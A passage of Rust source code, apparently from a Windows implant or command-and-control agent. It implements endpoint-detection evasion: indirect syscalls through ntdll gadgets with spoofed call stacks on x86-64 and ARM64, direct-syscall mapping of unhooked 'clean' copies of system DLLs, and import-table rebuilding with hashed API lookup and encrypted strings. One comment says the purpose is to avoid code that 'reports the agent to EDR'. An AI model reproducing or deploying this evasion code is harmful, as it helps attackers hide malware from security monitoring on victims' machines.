            // This keeps the topmost visible frame entirely within a loaded
            // module, eliminating the "call from unbacked memory" indicator.
            //
            // When `spoof_frame` == 0 (feature off or gadget unavailable),
            // `jz 44f` falls through to the plain `call r11` path so the
            // existing behaviour is preserved with negligible overhead.
            "test {spoof_frame}, {spoof_frame}",
            "jz 44f",
            // Spoofed path: push fake call chain, then jump to syscall gadget.
            "lea r15, [rip + 43f]",    // r15 = address of label 43 (real continuation)
            "push r15",                 // [rsp]   = real continuation  (popped by ntdll ret)
            "mov r15, {spoof_frame}",  // r15 = ret-gadget address from chain
            "push r15",                 // [rsp]   = spoof_frame         (popped by gadget ret)
            "jmp r11",                  // → syscall_gadget; ret → spoof_frame; ret → 43:
            "43:",
            "jmp 45f",
            // Plain indirect syscall (default, or fallback when spoof_frame == 0):
            "44:",
            "call r11",
            // ─────────────────────────────────────────────────────────────────
            "45:",
            "mov rsp, r14",
            ssn         = in(reg) ssn,
            gadget      = in(reg) gadget_addr,
            spoof_frame = in(reg) spoof_frame,
            // nstack → rcx; stack_ptr → rsi.  Explicit inout constraints prevent
            // the compiler from co-allocating either with a1/a2/ssn/gadget.
            inout("rcx") nstack => _,
            inout("rsi") stack_ptr => _,
            a1 = in(reg) a1,
            a2 = in(reg) a2,
            // r8/r9 are both inputs (args 3 and 4) and caller-saved (the called
            // function may overwrite them).  Declare as inlateout so the compiler
            // knows the values are gone after the asm block.
            inlateout("r8")  a3 => _,
            inlateout("r9")  a4 => _,
            lateout("rax") status,
            out("rdx") _, out("r10") _, out("r11") _,
            out("r14") _, out("r15") _,
            out("rdi") _,
            // NOTE: nostack intentionally absent — this asm block modifies RSP.
        );

        status
    }
    #[cfg(target_arch = "aarch64")]
    {
        // Windows ARM64 syscall convention: x0-x7 hold the first 8 arguments,
        // x8 is the syscall number.  Stack arguments (beyond 8) are not handled
        // here; virtually all NT syscalls fit in 8 registers.
        let a1 = args.get(0).copied().unwrap_or(0);
        let a2 = args.get(1).copied().unwrap_or(0);
        let a3 = args.get(2).copied().unwrap_or(0);
        let a4 = args.get(3).copied().unwrap_or(0);
        let a5 = args.get(4).copied().unwrap_or(0);
        let a6 = args.get(5).copied().unwrap_or(0);
        let a7 = args.get(6).copied().unwrap_or(0);
        let a8 = args.get(7).copied().unwrap_or(0);

        // ── NtContinue-based stack-spoof dispatch (ARM64) ──────────────────
        //
        // On ARM64, `ret` is `br x30` — it does NOT pop from the stack like
        // x86-64's `ret`.  To spoof the call chain we use function epilogue
        // gadgets found in ntdll that load x30 from a controlled stack slot:
        //
        //     ldp x29, x30, [sp, #M]   ; load x29/x30 from stack
        //     add  sp, sp, #N          ; (optional) unwind the frame
        //     ret                       ; branch to x30 (our continuation)
        //
        // See the NtContinue dispatch section below for full details.

        // ── NtContinue dispatch (ARM64, with epilogue-gadget support) ──────
        //
        // On ARM64, `ret` is `br x30` — it does NOT pop a return address from
        // the stack.  To spoof the call chain we use function epilogue gadgets
        // found in ntdll that load x30 from a controlled stack slot:
        //
        //     ldp x29, x30, [sp, #M]   ; load x29 from [sp+M], x30 from [sp+M+8]
        //     add  sp, sp, #N          ; (optional) unwind the frame
        //     ret                       ; branch to x30 (our continuation)
        //
        // By choosing M >= nstack*8 we place the continuation after the stack-
        // passed syscall arguments, so the kernel reads the real args from
        // [sp+0..] while the epilogue reads the continuation from [sp+M+8].
        //
        // Sp restoration: we save the original sp in CONTEXT.X20 and restore
        // it at the continuation.  This avoids depending on the epilogue's
        // `add sp` to adjust sp correctly.
        //
        // Buffer layout (ARM64, nstack stack-passed args):
        //
        //   buf[0]       = stack_arg[0]     ← [sp+0]  (arg 9)
        //   buf[1]       = stack_arg[1]     ← [sp+8]  (arg 10)
        //   ...
        //   buf[nstack-1]= stack_arg[n-1]   ← [sp+(n-1)*8]
        //   buf[nstack]  = fake_x29         ← [sp+nstack*8] (don't care)
        //   buf[nstack+1]= continuation     ← [sp+nstack*8+8] (loaded into x30)
        //
        // For nstack == 0 the buffer collapses to [fake_x29, continuation].
        #[cfg(feature = "stack-spoof")]
        {
            use crate::win_types::{CONTEXT, CONTEXT_CONTROL, CONTEXT_INTEGER};

            let ntcontinue_ssn: u32 = *NTCONTINUE_SSN.get_or_init(|| resolve_ntcontinue_ssn());

            if ntcontinue_ssn != 0 {
                // Stack args beyond the 8 register args (x0-x7).
                let stack_args: &[u64] = if args.len() > 8 { &args[8..] } else { &[] };
                let nstack = stack_args.len();

                // Try to find an ARM64 epilogue gadget with offset >= nstack*8.
                if let Some(epilogue) = crate::stack_db::get_arm64_epilogue_for_nstack(nstack) {
                    let padded_slots = (epilogue.stack_offset as usize) / 8;
                    let total_slots = padded_slots + 2; // +2 for (fake_x29, continuation)
                    let mut spoof_frame_buf: Vec<u64> = vec![0u64; total_slots];

                    // Fill stack args at the beginning of the buffer.
                    for (i, &arg) in stack_args.iter().enumerate() {
                        spoof_frame_buf[i] = arg;
                    }

                    // fake_x29 at padded_slots (value doesn't matter).
                    spoof_frame_buf[padded_slots] = 0;

                    // continuation at padded_slots + 1 — filled by asm.
                    let cont_slot_ptr: *mut u64 = &mut spoof_frame_buf[padded_slots + 1];

                    // Read current sp for later restoration via CONTEXT.X20.
                    let current_sp: u64;
                    unsafe {
                        core::arch::asm!("mov x9, sp", out("x9") current_sp);
                    }

                    // Build the ARM64 CONTEXT.  Must be 16-byte aligned.
                    let ctx_size = std::mem::size_of::<CONTEXT>();
                    let mut ctx_storage: Vec<u8> = vec![0u8; ctx_size + 15];
                    let ctx_ptr_raw = ctx_storage.as_mut_ptr() as usize;
                    let ctx_ptr_aligned = (ctx_ptr_raw + 15) & !15usize;
                    let ctx: &mut CONTEXT = unsafe { &mut *(ctx_ptr_aligned as *mut CONTEXT) };

                    ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;

                    ctx.u.s_mut().X8 = ssn as u64;
                    ctx.u.s_mut().X0 = a1;
                    ctx.u.s_mut().X1 = a2;
                    ctx.u.s_mut().X2 = a3;
                    ctx.u.s_mut().X3 = a4;
                    ctx.u.s_mut().X4 = a5;
                    ctx.u.s_mut().X5 = a6;
                    ctx.u.s_mut().X6 = a7;
                    ctx.u.s_mut().X7 = a8;

                    // Save original sp in X20 so we can restore at continuation.
                    ctx.u.s_mut().X20 = current_sp;

                    // Pc → syscall gadget (`svc #0; ret` in ntdll).
                    ctx.Pc = gadget_addr as u64;

                    // Lr → epilogue gadget.  After `svc #0; ret` at the
                    // syscall gadget, execution reaches this `ldp x29, x30,
                    // [sp, #M]` which loads x30 from our buffer and returns.
                    ctx.u.s_mut().Lr = epilogue.gadget_addr as u64;

                    // Sp → our frame buffer.  Kernel reads stack args from
                    // [sp+0..]; epilogue reads x30 from [sp+M+8].
                    ctx.Sp = spoof_frame_buf.as_ptr() as u64;

                    // Ensure writes are visible before the asm dispatch.
                    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);

                    let nt_status_raw: u64;
                    unsafe {
                        asm!(
                            // Fill in the continuation address.
                            "adr x21, 2f",
                            "str x21, [{cont_slot}]",
                            // NtContinue(PCONTEXT, BOOLEAN TestAlert)
                            "mov x0, {ctx_ptr}",
                            "mov x1, xzr",
                            "mov x8, {ntc_ssn}",
                            "svc #0",
                            // ── Continuation ──────────────────────────────
                            // Reached after: gadget `svc #0; ret` →
                            //   epilogue gadget `ldp x29,x30,[sp,#M]; …; ret` →
                            //   x30 = continuation → here.
                            // X0 = NTSTATUS.  X20 = original sp.
                            "2:",
                            "mov sp, x20",
                            "mov x9, x0",
                            ctx_ptr   = in(reg) ctx_ptr_aligned as u64,
                            cont_slot = in(reg) cont_slot_ptr as u64,
                            ntc_ssn   = in(reg) ntcontinue_ssn as u64,
                            lateout("x9") nt_status_raw,
                            out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
                            out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
                            out("x8")  _,
                            out("x10") _, out("x11") _,
                            out("x12") _, out("x13") _, out("x14") _, out("x15") _,
                            out("x16") _, out("x17") _,
                            out("x20") _,
                            out("x21") _,
                            out("x30") _,
                            out("v0")  _, out("v1")  _, out("v2")  _, out("v3")  _,
                            out("v4")  _, out("v5")  _, out("v6")  _, out("v7")  _,
                            out("v16") _, out("v17") _, out("v18") _, out("v19") _,
                            out("v20") _, out("v21") _, out("v22") _, out("v23") _,
                            out("v24") _, out("v25") _, out("v26") _, out("v27") _,
                            out("v28") _, out("v29") _, out("v30") _, out("v31") _,
                        );
                    }
                    let nt_status = nt_status_raw as u32 as i32;
                    let _ = &spoof_frame_buf;
                    let _ = &ctx_storage;
                    return nt_status;
                }
                // No suitable epilogue gadget — fall through to simple fallback.
            }
            // NtContinue SSN unavailable — fall through.
        }
        #[cfg(not(feature = "stack-spoof"))]
        {
            // Without stack-spoof, skip the NtContinue path entirely.
        }

        // ── Simple direct syscall fallback (ARM64) ─────────────────────────
        //
        // ARM64 Windows ABI: first 8 args in x0-x7, args 9+ on the stack at
        // [sp+0], [sp+8], … (after the callee's saved frame).  NT APIs like
        // NtCreateThreadEx take 11 arguments, so we must spill args[8..].
        let stack_args_a64: &[u64] = if args.len() > 8 { &args[8..] } else { &[] };
        let nstack_a64: usize = stack_args_a64.len();
        let stack_ptr_a64: *const u64 = stack_args_a64.as_ptr();

        let status_raw: u64;
        std::arch::asm!(
            // ── Save SP so we can restore after the call ──────────────────
            // NOTE: Use x20 instead of x19.  LLVM reserves x19 for internal
            // use on Windows ARM64 and rejects it as an explicit inline-asm
            // operand (E0437 / LLVM error).  x20 is callee-saved, survives
            // the blr to the syscall gadget, and is accepted by LLVM.
            "mov x20, sp",

            // ── Allocate stack space for stack-passed args (args[8..]) ───
            // Each arg is 8 bytes.  Round up to 16-byte alignment (AAPCS64).
            // x9 = nstack_a64 * 8, then align up to 16.
            "mov x9, {nstack}",
            "lsl x9, x9, #3",         // x9 = nstack * 8
            "add x9, x9, #15",
            "and x9, x9, #-16",        // 16-byte aligned size
            "sub sp, sp, x9",

            // ── Copy stack args to [sp .. sp + nstack*8] ─────────────────
            // x10 = count, x11 = src, x12 = dst.  Skip if zero args.
            "mov x10, {nstack}",
            "cbz x10, 2f",
            "mov x11, {stack_ptr}",
            "mov x12, sp",
            "1:",
            "ldr x13, [x11], #8",      // load arg, post-increment src
            "str x13, [x12], #8",      // store arg, post-increment dst
            "sub x10, x10, #1",
            "cbnz x10, 1b",
            "2:",

            // Load syscall number into x8 (Windows ARM64 convention).
            // Cast ssn to u64 so that {ssn} expands to the 64-bit Xn form;
            // u32 defaults to the 32-bit Wn form, which makes `mov x8, wN`
            // an invalid ARM64 instruction.
            "mov x8, {ssn}",
            // Place all 8 register arguments.
            "mov x0, {a1}",
            "mov x1, {a2}",
            "mov x2, {a3}",
            "mov x3, {a4}",
            "mov x4, {a5}",
            "mov x5, {a6}",
            "mov x6, {a7}",
            "mov x7, {a8}",
            // Indirect call to the syscall gadget (e.g. `svc #0; ret` in ntdll).
            // `blr` writes the return address into x30 (LR); the gadget's
            // trailing `ret` uses x30 to return here.  We declare x30 as a
            // clobber so the compiler saves any live value before this block.
            "blr {gadget}",
            // Copy the NTSTATUS from x0 into an explicit 64-bit output register.
            "mov x9, x0",
            // Restore SP.
            "mov sp, x20",

            ssn    = in(reg) ssn as u64,
            a1     = in(reg) a1,
            a2     = in(reg) a2,
            a3     = in(reg) a3,
            a4     = in(reg) a4,
            a5     = in(reg) a5,
            a6     = in(reg) a6,
            a7     = in(reg) a7,
            a8     = in(reg) a8,
            nstack = in(reg) nstack_a64 as u64,
            stack_ptr = in(reg) stack_ptr_a64 as u64,
            gadget = in(reg) gadget_addr as u64,
            lateout("x9") status_raw,
            // Declare all caller-saved integer registers (Windows ARM64 ABI).
            // x0-x7 hold args and may be modified by the syscall stub or kernel;
            // x8 holds the syscall number; x9-x17 are volatile scratch registers;
            // x20 is used to save/restore SP (callee-saved, declared as clobber);
            // x30 (LR) is overwritten by `blr`.
            out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
            out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
            out("x8")  _,
            out("x10") _, out("x11") _,
            out("x12") _, out("x13") _, out("x14") _, out("x15") _,
            out("x16") _, out("x17") _,
            out("x20") _,
            out("x30") _,
            // Caller-saved NEON/FP registers (v0-v7, v16-v31 per ABI).
            out("v0")  _, out("v1")  _, out("v2")  _, out("v3")  _,
            out("v4")  _, out("v5")  _, out("v6")  _, out("v7")  _,
            out("v16") _, out("v17") _, out("v18") _, out("v19") _,
            out("v20") _, out("v21") _, out("v22") _, out("v23") _,
            out("v24") _, out("v25") _, out("v26") _, out("v27") _,
            out("v28") _, out("v29") _, out("v30") _, out("v31") _,
            // `blr` may use the stack freely; do not use options(nostack).
        );
        // Keep stack_args_a64 slice alive until the asm block completes.
        let _ = &stack_args_a64;
        let status = status_raw as u32 as i32;
        status
    }
}

#[cfg(windows)]
static CLEAN_MODULES: OnceLock<Mutex<HashMap<String, usize>>> = OnceLock::new();

#[cfg(windows)]
pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
    let dll_lower = dll_name.to_lowercase();

    let cache_lock = CLEAN_MODULES.get_or_init(|| Mutex::new(HashMap::new()));
    if let Some(&base) = cache_lock.lock_recover().get(&dll_lower) {
        return Ok(base);
    }

    unsafe {
        let ntdll_base = {
            let guard = CLEAN_NTDLL.read_recover();
            if let Some(base) = *guard {
                base
            } else {
                drop(guard);
                let mut guard = CLEAN_NTDLL.write_recover();
                if let Some(base) = *guard {
                    base
                } else {
                    match map_clean_ntdll() {
                        Ok(b) => {
                            *guard = Some(b);
                            b
                        }
                        Err(e) => {
                            tracing::warn!(
                                "map_clean_dll: could not map clean ntdll.dll: {e}; \
                                 clean API resolution will fail for this session"
                            );
                            0
                        }
                    }
                }
            }
        };
        if ntdll_base == 0 {
            return Err(anyhow!(
                "clean ntdll mapping unavailable; cannot map clean '{dll_name}'"
            ));
        }

        let sys_ntcreatesection = get_syscall_id("NtCreateSection")?;
        let sys_ntmapview = get_syscall_id("NtMapViewOfSection")?;

        let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());

        let path_str = if dll_lower.contains(r"\") {
            dll_lower.clone()
        } else {
            format!(r"{}\System32\{}", sysroot, dll_name)
        };

        let sys_ntopenfile = get_syscall_id("NtOpenFile")?;

        let mut nt_path = format!(r"\??\{}", path_str)
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect::<Vec<u16>>();

        let mut obj_name: crate::win_types::UNICODE_STRING = std::mem::zeroed();
        obj_name.Length = ((nt_path.len() - 1) * 2) as u16;
        obj_name.MaximumLength = (nt_path.len() * 2) as u16;
        obj_name.Buffer = nt_path.as_mut_ptr();

        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
        obj_attr.ObjectName = &mut obj_name;
        obj_attr.Attributes = 0x00000040; // OBJ_CASE_INSENSITIVE

        let mut io_status: [u64; 2] = [0, 0];
        let mut h_file: crate::win_types::HANDLE = std::ptr::null_mut();

        let status = do_syscall(
            sys_ntopenfile.ssn,
            sys_ntopenfile.gadget_addr,
            &[
                &mut h_file as *mut _ as u64,
                0x80100000, // SYNCHRONIZE | FILE_READ_DATA (GENERIC_READ)
                &mut obj_attr as *mut _ as u64,
                &mut io_status as *mut _ as u64,
                1,    // FILE_SHARE_READ
                0x20, // FILE_SYNCHRONOUS_IO_NONALERT
            ],
        );

        if status != 0 {
            return Err(anyhow!(
                "Failed to open {} with NtOpenFile. Status: {:x}",
                dll_name,
                status
            ));
        }

        let mut h_section: crate::win_types::HANDLE = std::ptr::null_mut();
        let status = do_syscall(
            sys_ntcreatesection.ssn,
            sys_ntcreatesection.gadget_addr,
            &[
                &mut h_section as *mut _ as u64,
                0x000f0000 | 0x0004 | 0x0008, // SECTION_MAP_READ | SECTION_MAP_EXECUTE | STANDARD_RIGHTS_REQUIRED
                std::ptr::null_mut::<u64>() as u64,
                std::ptr::null_mut::<u64>() as u64,
                0x20,      // PAGE_EXECUTE_READ
                0x1000000, // SEC_IMAGE
                h_file as u64,
            ],
        );
        pe_resolve::close_handle(h_file as *mut _);

        if status != 0 || h_section.is_null() {
            return Err(anyhow!(
                "NtCreateSection failed with status {:x}. Refusing to initialize.",
                status
            ));
        }

        let mut base_addr: crate::win_types::PVOID = std::ptr::null_mut();
        let mut view_size: crate::win_types::SIZE_T = 0;

        let status = do_syscall(
            sys_ntmapview.ssn,
            sys_ntmapview.gadget_addr,
            &[
                h_section as u64,
                -1isize as u64, // CurrentProcess
                &mut base_addr as *mut _ as u64,
                0,
                0,
                std::ptr::null_mut::<u64>() as u64,
                &mut view_size as *mut _ as u64,
                1, // ViewShare
                0,
                0x20, // PAGE_EXECUTE_READ
            ],
        );
        pe_resolve::close_handle(h_section as *mut _);

        if status != 0 || base_addr.is_null() {
            return Err(anyhow!(
                "NtMapViewOfSection failed with status {:x}. Refusing to initialize.",
                status
            ));
        }

        let base = base_addr as usize;
        cache_lock.lock_recover().insert(dll_lower.clone(), base);

        // Construct a fresh Import Address Table
        if let Err(e) = rebuild_iat(base) {
            tracing::warn!("Failed to rebuild IAT for clean {}: {}", dll_name, e);
        }

        Ok(base)
    }
}

#[cfg(windows)]
unsafe fn rebuild_iat(base: usize) -> Result<()> {
    let dos_header = base as *const windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE {
        anyhow::bail!("Invalid DOS signature");
    }

    let (nt_base, opt_magic) =
        pe_nt_base_and_magic(base).ok_or_else(|| anyhow!("Invalid NT headers"))?;

    let import_dir_rva = match opt_magic {
        windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
            let nt_headers32 = nt_base
                as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
            (*nt_headers32).OptionalHeader.DataDirectory
                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_IMPORT
                    as usize]
                .VirtualAddress
        }
        windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
            let nt_headers64 = nt_base
                as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
            (*nt_headers64).OptionalHeader.DataDirectory
                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_IMPORT
                    as usize]
                .VirtualAddress
        }
        _ => anyhow::bail!("Unsupported PE optional-header magic: 0x{:x}", opt_magic),
    };
    if import_dir_rva == 0 {
        return Ok(()); // No imports
    }

    let mut import_desc = (base + import_dir_rva as usize)
        as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR;

    // M-26 Part D: resolve NtProtectVirtualMemory once for IAT protection changes.
    type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
        *mut std::ffi::c_void,
        *mut *mut std::ffi::c_void,
        *mut crate::win_types::SIZE_T,
        u32,
        *mut u32,
    ) -> i32;
    let nt_protect: Option<NtProtectVirtualMemoryFn> = {
        let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0);
        let nt_protect_hash = pe_resolve::hash_str(b"NtProtectVirtualMemory\0");
        if ntdll != 0 {
            pe_resolve::get_proc_address_by_hash(ntdll, nt_protect_hash)
                .map(|p| std::mem::transmute::<*const (), NtProtectVirtualMemoryFn>(p as *const ()))
        } else {
            None
        }
    };

    /// IAT-free fallback: resolves VirtualProtect from kernel32 via pe_resolve
    /// and invokes NtProtectVirtualMemory-style calling convention.
    /// Used when the ntdll-based nt_protect resolution above fails.
    #[inline(always)]
    unsafe fn nt_protect_fallback(
        addr: *mut std::ffi::c_void,
        size: usize,
        new_prot: u32,
        old_prot: &mut u32,
    ) {
        // Try kernel32!VirtualProtect via pe_resolve as last resort.
        if let Some(k32) = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) {
            if let Some(vp_addr) =
                pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"VirtualProtect\0"))
            {
                let vp: unsafe extern "system" fn(
                    *mut std::ffi::c_void,
                    usize,
                    u32,
                    *mut u32,
                ) -> i32 = std::mem::transmute(vp_addr);
                vp(addr, size, new_prot, old_prot);
            }
        }
    }

    while (*import_desc).Name != 0 {
        let dll_name_ptr = (base + (*import_desc).Name as usize) as *const i8;
        let dll_name = std::ffi::CStr::from_ptr(dll_name_ptr)
            .to_str()
            .unwrap_or("");
        let dll_lower = dll_name.to_lowercase();

        // Critical DLLs we explicitly want clean copies of.
        // Check the cache first *without* recursing; if already mapped use it.
        // This prevents a deadlock if two threads race on the same DLL, or if
        // the dependency graph has a cycle (e.g., ntdll ↔ win32u forwarding).
        let is_critical = dll_lower
            == String::from_utf8_lossy(&string_crypt::enc_str!("ntdll.dll")).trim_end_matches('\0')
            || dll_lower
                == String::from_utf8_lossy(&string_crypt::enc_str!("kernelbase.dll"))
                    .trim_end_matches('\0')
            || dll_lower
                == String::from_utf8_lossy(&string_crypt::enc_str!("kernel32.dll"))
                    .trim_end_matches('\0');

        let dep_handle = if is_critical {
            // Fast-path: already in cache? Use it without recursing.
            let cached = CLEAN_MODULES
                .get()
                .and_then(|m| m.lock_recover().get(&dll_lower).copied());
            if let Some(b) = cached {
                b as *mut crate::win_types::HINSTANCE
            } else {
                match map_clean_dll(&dll_lower) {
                    Ok(b) => b as *mut crate::win_types::HINSTANCE,
                    Err(e) => {
                        // M-26: do NOT fall back to LoadLibraryA. Skip and warn.
                        // Unresolved IAT entries crashing on use is preferable to
                        // running hooked code that reports the agent to EDR.
                        tracing::warn!(
                            "rebuild_iat: clean mapping of {} failed ({}), skipping (refusing to fall back to hooked LoadLibraryA)",
                            dll_name, e
                        );
                        import_desc = import_desc.add(1);
                        continue;
                    }
                }
            }
        } else {
            match map_clean_dll(&dll_lower) {
                Ok(b) => b as *mut crate::win_types::HINSTANCE,
                Err(e) => {
                    tracing::warn!(
                        "rebuild_iat: clean mapping of {} failed ({}), skipping (refusing to fall back to hooked LoadLibraryA)",
                        dll_name, e
                    );
                    import_desc = import_desc.add(1);
                    continue;
                }
            }
        };

        if !dep_handle.is_null() {
            let original_thunk_rva = if (*import_desc).Anonymous.OriginalFirstThunk != 0 {
                (*import_desc).Anonymous.OriginalFirstThunk
            } else {
                (*import_desc).FirstThunk
            };

            if opt_magic
                == windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR32_MAGIC
            {
                let mut original_thunk = (base + original_thunk_rva as usize)
                    as *const windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32;
                let mut first_thunk = (base + (*import_desc).FirstThunk as usize)
                    as *mut windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32;

                // Make IAT writable
                let mut num_thunks = 0;
                let mut temp_thunk = first_thunk;
                while (*temp_thunk).u1.AddressOfData != 0 {
                    num_thunks += 1;
                    temp_thunk = temp_thunk.add(1);
                }
                let iat_size = (num_thunks + 1)
                    * std::mem::size_of::<
                        windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32,
                    >();

                let mut old_protect = 0u32;
                {
                    let mut base_ptr = first_thunk as *mut std::ffi::c_void;
                    let mut region_size = iat_size as crate::win_types::SIZE_T;
                    if let Some(nt_p) = nt_protect {
                        nt_p(
                            -1isize as *mut std::ffi::c_void,
                            &mut base_ptr,
                            &mut region_size,
                            crate::win_types::PAGE_READWRITE,
                            &mut old_protect,
                        );
                    } else {
                        nt_protect_fallback(
                            first_thunk as *mut _,
                            iat_size,
                            crate::win_types::PAGE_READWRITE,
                            &mut old_protect,
                        );
                    }
                }

                while (*original_thunk).u1.AddressOfData != 0 {
                    let addr_of_data = (*original_thunk).u1.AddressOfData;
                    let proc_addr = if (addr_of_data
                        & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG32)
                        != 0
                    {
                        let ordinal = (addr_of_data & 0xffff) as u16;
                        let addr = get_export_addr_by_ordinal(dep_handle as usize, ordinal as u32);
                        if !addr.is_null() {
                            addr as usize
                        } else {
                            tracing::warn!(
                                "rebuild_iat: ordinal {} in {} could not be resolved cleanly, leaving IAT slot unfilled",
                                ordinal, dll_name
                            );
                            0
                        }
                    } else {
                        let import_by_name = (base + addr_of_data as usize)
                            as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_BY_NAME;
                        let name_ptr = (*import_by_name).Name.as_ptr();
                        get_export_addr(dep_handle as usize, name_ptr)
                    };

                    if proc_addr != 0 {
                        if let Ok(proc_addr32) = u32::try_from(proc_addr) {
                            let mut_u1 = &mut (*first_thunk).u1 as *mut _ as *mut u32;
                            *mut_u1 = proc_addr32;
                        } else {
                            tracing::warn!(
                                "rebuild_iat: resolved address {:#x} for {} exceeds 32-bit range; leaving slot unfilled",
                                proc_addr,
                                dll_name
                            );
                        }
                    }

                    original_thunk = original_thunk.add(1);
                    first_thunk = first_thunk.add(1);
                }

                {
                    let restore_addr = first_thunk.sub(num_thunks) as *mut std::ffi::c_void;
                    let mut base_ptr = restore_addr;
                    let mut region_size = iat_size as crate::win_types::SIZE_T;
                    let mut prev_protect = 0u32;
                    if let Some(nt_p) = nt_protect {
                        nt_p(
                            -1isize as *mut std::ffi::c_void,
                            &mut base_ptr,
                            &mut region_size,
                            old_protect,
                            &mut prev_protect,
                        );
                    } else {
                        nt_protect_fallback(
                            restore_addr as *mut _,
                            iat_size,
                            old_protect,
                            &mut prev_protect,
                        );
                    }
                }
            } else {
                let mut original_thunk = (base + original_thunk_rva as usize)
                    as *const windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64;
                let mut first_thunk = (base + (*import_desc).FirstThunk as usize)
                    as *mut windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64;

                // Make IAT writable
                let mut num_thunks = 0;
                let mut temp_thunk = first_thunk;
                while (*temp_thunk).u1.AddressOfData != 0 {
                    num_thunks += 1;
                    temp_thunk = temp_thunk.add(1);
                }
                let iat_size = (num_thunks + 1)
                    * std::mem::size_of::<
                        windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64,
                    >();

                let mut old_protect = 0u32;
                {
                    let mut base_ptr = first_thunk as *mut std::ffi::c_void;
                    let mut region_size = iat_size as crate::win_types::SIZE_T;
                    if let Some(nt_p) = nt_protect {
                        nt_p(
                            -1isize as *mut std::ffi::c_void,
                            &mut base_ptr,
                            &mut region_size,
                            crate::win_types::PAGE_READWRITE,
                            &mut old_protect,
                        );
                    } else {
                        nt_protect_fallback(
                            first_thunk as *mut _,
                            iat_size,
                            crate::win_types::PAGE_READWRITE,
                            &mut old_protect,
                        );
                    }
                }

                while (*original_thunk).u1.AddressOfData != 0 {
                    let addr_of_data = (*original_thunk).u1.AddressOfData as u64;
                    let proc_addr = if (addr_of_data
                        & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG64)
                        != 0
                    {
                        let ordinal = (addr_of_data & 0xffff) as u16;
                        // Resolve via clean export table instead of hookable GetProcAddress (M-24/M-26).
                        let addr = get_export_addr_by_ordinal(dep_handle as usize, ordinal as u32);
                        if !addr.is_null() {
                            addr as usize
                        } else {
                            // M-26: do NOT fall back to GetProcAddress. Leave the slot at 0.
                            tracing::warn!(
                                "rebuild_iat: ordinal {} in {} could not be resolved cleanly, leaving IAT slot unfilled",
                                ordinal, dll_name
                            );
                            0
                        }
                    } else {
                        let import_by_name = (base + addr_of_data as usize)
                            as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_BY_NAME;
                        let name_ptr = (*import_by_name).Name.as_ptr();
                        get_export_addr(dep_handle as usize, name_ptr)
                    };

                    if proc_addr != 0 {
                        let mut_u1 = &mut (*first_thunk).u1 as *mut _ as *mut u64;
                        *mut_u1 = proc_addr as u64;
                    }

                    original_thunk = original_thunk.add(1);
                    first_thunk = first_thunk.add(1);
                }

                {
                    let restore_addr = first_thunk.sub(num_thunks) as *mut std::ffi::c_void;
                    let mut base_ptr = restore_addr;
                    let mut region_size = iat_size as crate::win_types::SIZE_T;
                    let mut prev_protect = 0u32;
                    if let Some(nt_p) = nt_protect {
                        nt_p(
                            -1isize as *mut std::ffi::c_void,
                            &mut base_ptr,
                            &mut region_size,
                            old_protect,
                            &mut prev_protect,
                        );
                    } else {
                        nt_protect_fallback(
                            restore_addr as *mut _,
                            iat_size,
                            old_protect,
                            &mut prev_protect,
                        );
                    }
                }
            }
        }

        import_desc = import_desc.add(1);
    }

    Ok(())
}

#[cfg(windows)]
unsafe fn get_export_addr(base: usize, func_name_ptr: *const i8) -> usize {
    if func_name_ptr.is_null() {
        return 0;
    }

    let target_name = std::ffi::CStr::from_ptr(func_name_ptr).to_bytes_with_nul();
    let target_hash = pe_resolve::hash_str(target_name);
    pe_resolve::get_proc_address_by_hash(base, target_hash).unwrap_or(0)
}

#[cfg(windows)]
unsafe fn pe_nt_base_and_magic(base: usize) -> Option<(usize, u16)> {
    let dos_header = base as *const windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE {
        return None;
    }

    let nt_base = base + (*dos_header).e_lfanew as usize;
    if *(nt_base as *const u32) != windows_sys::Win32::System::SystemServices::IMAGE_NT_SIGNATURE {
        return None;
    }

    let opt_magic = *((nt_base
        + 4
        + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>())
        as *const u16);
